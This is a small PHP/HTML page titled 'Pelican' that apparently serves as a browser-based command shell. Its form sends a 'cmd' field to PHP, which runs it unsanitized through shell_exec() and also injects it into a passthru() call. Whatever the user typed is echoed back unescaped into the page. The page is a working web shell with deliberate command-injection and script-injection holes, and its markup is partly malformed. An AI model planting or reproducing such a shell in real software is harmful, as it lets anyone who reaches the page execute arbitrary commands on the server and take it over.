<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pelican</title>
    <link rel="stylesheet" href="css/shell.css">
  </head>

    </body>
        <div class="shell">
          <form action="" method="post">
            <input type="text" name="cmd" id="cmdline" placeholder=">>">
            <input type="submit" id="btn" onclick="loginput()" value="Execute">
            <div id="display"></div>
          </form>

        <script>
          function loginput() {
            var input = document.getElementById("cmdline").value;
            var display = document.getElementById("display");
            display.innerHTML += input;
          }
        </script>

        <div class="php">
        <?php
          if (isset($_POST["cmd"])) {
            $command = $_POST["cmd"];
            echo $command;
            echo passthru("python SaveLogs.py $command");
            $output = shell_exec($command);  

            echo "<pre>$output</pre>";
          }
        ?>
        </div>

        </div>
    </body>
</html>